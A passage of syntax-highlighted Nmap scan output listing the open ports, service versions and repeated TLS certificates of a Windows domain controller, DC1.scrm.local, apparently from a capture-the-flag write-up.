</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       REASON  VERSION
</span></span><span style="display:flex;"><span>53/tcp    open  domain        syn-ack Simple DNS Plus
</span></span><span style="display:flex;"><span>80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span>|_http-title: Scramble Corp Intranet
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2022-09-20 01:05:04Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>scrm-DC1-CA/domainComponent<span style="color:#f92672">=</span>scrm
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T15:30:57
</span></span><span style="display:flex;"><span>| Not valid after:  2023-06-09T15:30:57
</span></span><span style="display:flex;"><span>| MD5:   679c fca8 69ad 25c0 86d2 e8bb <span style="color:#ae81ff">1792</span> d7c3
</span></span><span style="display:flex;"><span>| SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 <span style="color:#ae81ff">4233</span>
</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
</span></span><span style="display:flex;"><span>| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
</span></span><span style="display:flex;"><span>| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
</span></span><span style="display:flex;"><span>| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
</span></span><span style="display:flex;"><span>| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
</span></span><span style="display:flex;"><span>| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
</span></span><span style="display:flex;"><span>| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
</span></span><span style="display:flex;"><span>| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
</span></span><span style="display:flex;"><span>| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
</span></span><span style="display:flex;"><span>| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
</span></span><span style="display:flex;"><span>| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
</span></span><span style="display:flex;"><span>| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
</span></span><span style="display:flex;"><span>| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
</span></span><span style="display:flex;"><span>| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
</span></span><span style="display:flex;"><span>| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
</span></span><span style="display:flex;"><span>| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
</span></span><span style="display:flex;"><span>| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
</span></span><span style="display:flex;"><span>| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
</span></span><span style="display:flex;"><span>| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
</span></span><span style="display:flex;"><span>| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
</span></span><span style="display:flex;"><span>| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
</span></span><span style="display:flex;"><span>| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
</span></span><span style="display:flex;"><span>| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
</span></span><span style="display:flex;"><span>| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
</span></span><span style="display:flex;"><span>| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
</span></span><span style="display:flex;"><span>| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
</span></span><span style="display:flex;"><span>| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
</span></span><span style="display:flex;"><span>| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
</span></span><span style="display:flex;"><span>| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
</span></span><span style="display:flex;"><span>| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
</span></span><span style="display:flex;"><span>| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
</span></span><span style="display:flex;"><span>| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
</span></span><span style="display:flex;"><span>| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
</span></span><span style="display:flex;"><span>| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds? syn-ack
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?     syn-ack
</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>scrm-DC1-CA/domainComponent<span style="color:#f92672">=</span>scrm
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T15:30:57
</span></span><span style="display:flex;"><span>| Not valid after:  2023-06-09T15:30:57
</span></span><span style="display:flex;"><span>| MD5:   679c fca8 69ad 25c0 86d2 e8bb <span style="color:#ae81ff">1792</span> d7c3
</span></span><span style="display:flex;"><span>| SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 <span style="color:#ae81ff">4233</span>
</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
</span></span><span style="display:flex;"><span>| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
</span></span><span style="display:flex;"><span>| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
</span></span><span style="display:flex;"><span>| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
</span></span><span style="display:flex;"><span>| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
</span></span><span style="display:flex;"><span>| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
</span></span><span style="display:flex;"><span>| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
</span></span><span style="display:flex;"><span>| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
</span></span><span style="display:flex;"><span>| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
</span></span><span style="display:flex;"><span>| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
</span></span><span style="display:flex;"><span>| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
</span></span><span style="display:flex;"><span>| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
</span></span><span style="display:flex;"><span>| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
</span></span><span style="display:flex;"><span>| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
</span></span><span style="display:flex;"><span>| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
</span></span><span style="display:flex;"><span>| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
</span></span><span style="display:flex;"><span>| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
</span></span><span style="display:flex;"><span>| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
</span></span><span style="display:flex;"><span>| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
</span></span><span style="display:flex;"><span>| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
</span></span><span style="display:flex;"><span>| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
</span></span><span style="display:flex;"><span>| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
</span></span><span style="display:flex;"><span>| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
</span></span><span style="display:flex;"><span>| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
</span></span><span style="display:flex;"><span>| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
</span></span><span style="display:flex;"><span>| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
</span></span><span style="display:flex;"><span>| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
</span></span><span style="display:flex;"><span>| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
</span></span><span style="display:flex;"><span>| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
</span></span><span style="display:flex;"><span>| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
</span></span><span style="display:flex;"><span>| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
</span></span><span style="display:flex;"><span>| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
</span></span><span style="display:flex;"><span>| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
</span></span><span style="display:flex;"><span>| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server <span style="color:#ae81ff">2019</span> 15.00.2000.00; RTM
</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2022-09-19T16:33:03
</span></span><span style="display:flex;"><span>| Not valid after:  2052-09-19T16:33:03
</span></span><span style="display:flex;"><span>| MD5:   273c 8bd6 b6f1 8d1c 305d 858b 16a0 0ab3
</span></span><span style="display:flex;"><span>| SHA-1: 9f00 d439 36bf e405 f25e f6f8 259f eea5 a66d 64d4
</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
</span></span><span style="display:flex;"><span>| MIIDADCCAeigAwIBAgIQFlmhJUE9ubFLfgHuEklivDANBgkqhkiG9w0BAQsFADA7
</span></span><span style="display:flex;"><span>| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
</span></span><span style="display:flex;"><span>| bABsAGIAYQBjAGswIBcNMjIwOTE5MTYzMzAzWhgPMjA1MjA5MTkxNjMzMDNaMDsx
</span></span><span style="display:flex;"><span>| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
</span></span><span style="display:flex;"><span>| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJwUOThD
</span></span><span style="display:flex;"><span>| xI9qdzH62pze2vXWwAGlzCXQGWKL8RWKzDagYmowdy7VJPtfSAxqruwnTndUXec/
</span></span><span style="display:flex;"><span>| DzxxA12X1MIi+yonfuaDjN2U2zwWJfL/6TtcXLOQ6KTge9tkeceFyT3o6SRUU4wC
</span></span><span style="display:flex;"><span>| BtJI0cAAOFjJHMwyuhyhHMMWUr3NKVxSlm4+JJ0IbGoGiSBDFpXmK7CDCurE5/gn
</span></span><span style="display:flex;"><span>| jQeYab81PgLEPZ31odQZB4SB+qxlzWtmjsza7gK3h5UNc/L26MqLoVgy+DKgVstw
</span></span><span style="display:flex;"><span>| vlAi7/hRqBlGmKh27l0RfYkNdRgh41Ubm4dnZwv5IwgP2o17QG33zG/UdJhz4IUr
</span></span><span style="display:flex;"><span>| DZcUSJ83SE5SdXECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAkwE5dvp2UE799mtf
</span></span><span style="display:flex;"><span>| nwVxExeOZbLsjVRaAlBCOWsy6OH0F8cnnJnbKeTndwWOCWVhLUMAGxRqrRsmtOdi
</span></span><span style="display:flex;"><span>| OYqDgPYy2UlCcGeA7Ciyt3fG0erPh3fpJ/3rWEEbjdpKGfu26KLiYcVx6bZaSS/e
</span></span><span style="display:flex;"><span>| Q3CR4fDCKMlfWwDyNN5+FjC8KHttRxUmYna6IPnoZeLiz4C99RquTGWPAnIB3/7P
</span></span><span style="display:flex;"><span>| Ll+3+PjP7j3lWwOwT/TpJYabp33OcRWCKwzEiW2bItpB2hv0KLKcG8VVuBjINd9C
</span></span><span style="display:flex;"><span>| HR7g9WVBeq9hwElNVjAQNxmD49683WUs37bSFTOipKIp/8+RReNOXjikBison7Ku
</span></span><span style="display:flex;"><span>| RnjPWA<span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>scrm-DC1-CA/domainComponent<span style="color:#f92672">=</span>scrm
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T15:30:57
</span></span><span style="display:flex;"><span>| Not valid after:  2023-06-09T15:30:57
</span></span><span style="display:flex;"><span>| MD5:   679c fca8 69ad 25c0 86d2 e8bb <span style="color:#ae81ff">1792</span> d7c3
</span></span><span style="display:flex;"><span>| SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 <span style="color:#ae81ff">4233</span>
</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
</span></span><span style="display:flex;"><span>| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
</span></span><span style="display:flex;"><span>| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
</span></span><span style="display:flex;"><span>| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
</span></span><span style="display:flex;"><span>| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
</span></span><span style="display:flex;"><span>| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
</span></span><span style="display:flex;"><span>| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
</span></span><span style="display:flex;"><span>| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
</span></span><span style="display:flex;"><span>| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
</span></span><span style="display:flex;"><span>| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
</span></span><span style="display:flex;"><span>| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
</span></span><span style="display:flex;"><span>| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
</span></span><span style="display:flex;"><span>| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
</span></span><span style="display:flex;"><span>| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
</span></span><span style="display:flex;"><span>| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
</span></span><span style="display:flex;"><span>| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
</span></span><span style="display:flex;"><span>| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
</span></span><span style="display:flex;"><span>| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
</span></span><span style="display:flex;"><span>| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
</span></span><span style="display:flex;"><span>| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
</span></span><span style="display:flex;"><span>| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
</span></span><span style="display:flex;"><span>| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
</span></span><span style="display:flex;"><span>| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
</span></span><span style="display:flex;"><span>| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
</span></span><span style="display:flex;"><span>| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
</span></span><span style="display:flex;"><span>| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
</span></span><span style="display:flex;"><span>| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
</span></span><span style="display:flex;"><span>| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
</span></span><span style="display:flex;"><span>| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
</span></span><span style="display:flex;"><span>| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
</span></span><span style="display:flex;"><span>| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
</span></span><span style="display:flex;"><span>| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
</span></span><span style="display:flex;"><span>| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
</span></span><span style="display:flex;"><span>| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>scrm-DC1-CA/domainComponent<span style="color:#f92672">=</span>scrm
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T15:30:57
</span></span><span style="display:flex;"><span>| Not valid after:  2023-06-09T15:30:57
</span></span><span style="display:flex;"><span>| MD5:   679c fca8 69ad 25c0 86d2 e8bb <span style="color:#ae81ff">1792</span> d7c3
</span></span><span style="display:flex;"><span>| SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 <span style="color:#ae81ff">4233</span>
</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
</span></span><span style="display:flex;"><span>| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
</span></span><span style="display:flex;"><span>| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
</span></span><span style="display:flex;"><span>| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
</span></span><span style="display:flex;"><span>| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
</span></span><span style="display:flex;"><span>| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
</span></span><span style="display:flex;"><span>| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
</span></span><span style="display:flex;"><span>| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
</span></span><span style="display:flex;"><span>| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
</span></span><span style="display:flex;"><span>| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
</span></span><span style="display:flex;"><span>| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
</span></span><span style="display:flex;"><span>| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
</span></span><span style="display:flex;"><span>| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
</span></span><span style="display:flex;"><span>| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
</span></span><span style="display:flex;"><span>| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
</span></span><span style="display:flex;"><span>| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
</span></span><span style="display:flex;"><span>| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
</span></span><span style="display:flex;"><span>| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
</span></span><span style="display:flex;"><span>| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
